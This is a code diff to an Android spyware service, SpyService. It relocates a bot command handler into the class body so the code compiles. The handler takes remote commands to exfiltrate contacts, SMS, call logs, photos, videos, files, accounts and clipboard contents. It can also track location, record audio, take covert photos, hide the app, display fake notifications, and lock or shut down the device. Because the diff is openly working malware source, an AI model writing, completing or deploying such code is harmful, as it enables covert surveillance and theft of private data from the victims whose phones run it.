@@ -184,8 +184,58 @@ public class SpyService extends Service {
         }
     }
 
+    private void handleCommand(String cmd) {
+        String upper = cmd.toUpperCase();
 
-    // ========== القوائم التفاعلية (الأزرار) ==========
+        if (cmd.equals("/start") || cmd.equals("/help") || cmd.equals("/commands") || cmd.equals("/menu")) {
+            sendMainMenu();
+            return;
+        }
+
+        try {
+            switch (upper) {
+                case "GET_CONTACTS": sendFile(collectContacts(), "📇 جهات الاتصال"); break;
+                case "GET_SMS": sendFile(collectSms(), "💬 الرسائل النصية"); break;
+                case "GET_CALLLOGS": sendFile(collectCallLogs(), "📞 سجل المكالمات"); break;
+                case "GET_LOCATION": getLocation(); break;
+                case "START_RECORD": startRecording(); break;
+                case "STOP_RECORD": stopRecording(); break;
+                case "GET_APPS": sendFile(collectApps(), "📱 التطبيقات المثبتة"); break;
+                case "GET_PHOTOS": sendFile(collectMedia("images"), "🖼 جميع الصور"); break;
+                case "GET_VIDEOS": sendFile(collectMedia("videos"), "🎬 جميع الفيديوهات"); break;
+                case "GET_FILES": sendFile(collectAllFiles(), "📦 جميع الملفات"); break;
+                case "HIDE_APP": hideApp(); break;
+                case "SHOW_APP": showApp(); break;
+                case "FAKE_NOTIF": showFakeNotification(); break;
+                case "TAKE_PHOTO": takePhoto(); break;
+                case "TAKE_PHOTO_FRONT": takePhotoFront(); break;
+                case "FLASH_ON": flashOn(); break;
+                case "FLASH_OFF": flashOff(); break;
+                case "GET_IMEI": getImei(); break;
+                case "GET_PHONE": getPhoneNumber(); break;
+                case "GET_SIM": getSimInfo(); break;
+                case "GET_WIFI": getWifiInfo(); break;
+                case "GET_BATTERY": getBatteryInfo(); break;
+                case "GET_IP": getPublicIp(); break;
+                case "START_LOCATION_TRACK": startLocationTracking(); break;
+                case "STOP_LOCATION_TRACK": stopLocationTracking(); break;
+                case "GET_INSTALLED": getInstalledPackages(); break;
+                case "GET_PROCESSES": getRunningProcesses(); break;
+                case "LOCK_DEVICE": lockDevice(); break;
+                case "REBOOT": rebootDevice(); break;
+                case "SHUTDOWN": shutdownDevice(); break;
+                case "GET_ACCOUNTS": getAccounts(); break;
+                case "GET_CLIPBOARD": getClipboard(); break;
+                default:
+                    bot.sendText("❌ أمر غير معروف. استخدم /menu لعرض الأزرار.");
+            }
+        } catch (Exception e) {
+            bot.sendText("❌ خطأ أثناء تنفيذ الأمر: " + e.getMessage());
+            Log.e(TAG, "handleCommand error", e);
+        }
+    }
+
+    // ========== القوائم التفاعلية ==========
 
     private void sendMainMenu() {
         try {
@@ -266,8 +316,6 @@ public class SpyService extends Service {
             Log.e(TAG, "sendMainMenu error", e);
         }
     }
-
-    // ========== معالجة استدعاءات الأزرار ==========
 
     private void handleCallbackQuery(JSONObject callbackQuery) {
         try {
@@ -771,53 +819,3 @@ public class SpyService extends Service {
         startService(new Intent(this, SpyService.class));
     }
 }
-    private void handleCommand(String cmd) {
-        String upper = cmd.toUpperCase();
-
-        if (cmd.equals("/start") || cmd.equals("/help") || cmd.equals("/commands") || cmd.equals("/menu")) {
-            sendMainMenu();
-            return;
-        }
-
-        try {
-            switch (upper) {
-                case "GET_CONTACTS": sendFile(collectContacts(), "📇 جهات الاتصال"); break;
-                case "GET_SMS": sendFile(collectSms(), "💬 الرسائل النصية"); break;
-                case "GET_CALLLOGS": sendFile(collectCallLogs(), "📞 سجل المكالمات"); break;
-                case "GET_LOCATION": getLocation(); break;
-                case "START_RECORD": startRecording(); break;
-                case "STOP_RECORD": stopRecording(); break;
-                case "GET_APPS": sendFile(collectApps(), "📱 التطبيقات المثبتة"); break;
-                case "GET_PHOTOS": sendFile(collectMedia("images"), "🖼 جميع الصور"); break;
-                case "GET_VIDEOS": sendFile(collectMedia("videos"), "🎬 جميع الفيديوهات"); break;
-                case "GET_FILES": sendFile(collectAllFiles(), "📦 جميع الملفات"); break;
-                case "HIDE_APP": hideApp(); break;
-                case "SHOW_APP": showApp(); break;
-                case "FAKE_NOTIF": showFakeNotification(); break;
-                case "TAKE_PHOTO": takePhoto(); break;
-                case "TAKE_PHOTO_FRONT": takePhotoFront(); break;
-                case "FLASH_ON": flashOn(); break;
-                case "FLASH_OFF": flashOff(); break;
-                case "GET_IMEI": getImei(); break;
-                case "GET_PHONE": getPhoneNumber(); break;
-                case "GET_SIM": getSimInfo(); break;
-                case "GET_WIFI": getWifiInfo(); break;
-                case "GET_BATTERY": getBatteryInfo(); break;
-                case "GET_IP": getPublicIp(); break;
-                case "START_LOCATION_TRACK": startLocationTracking(); break;
-                case "STOP_LOCATION_TRACK": stopLocationTracking(); break;
-                case "GET_INSTALLED": getInstalledPackages(); break;
-                case "GET_PROCESSES": getRunningProcesses(); break;
-                case "LOCK_DEVICE": lockDevice(); break;
-                case "REBOOT": rebootDevice(); break;
-                case "SHUTDOWN": shutdownDevice(); break;
-                case "GET_ACCOUNTS": getAccounts(); break;
-                case "GET_CLIPBOARD": getClipboard(); break;
-                default:
-                    bot.sendText("❌ أمر غير معروف. استخدم /menu لعرض الأزرار.");
-            }
-        } catch (Exception e) {
-            bot.sendText("❌ خطأ أثناء تنفيذ الأمر: " + e.getMessage());
-            Log.e(TAG, "handleCommand error", e);
-        }
-    }
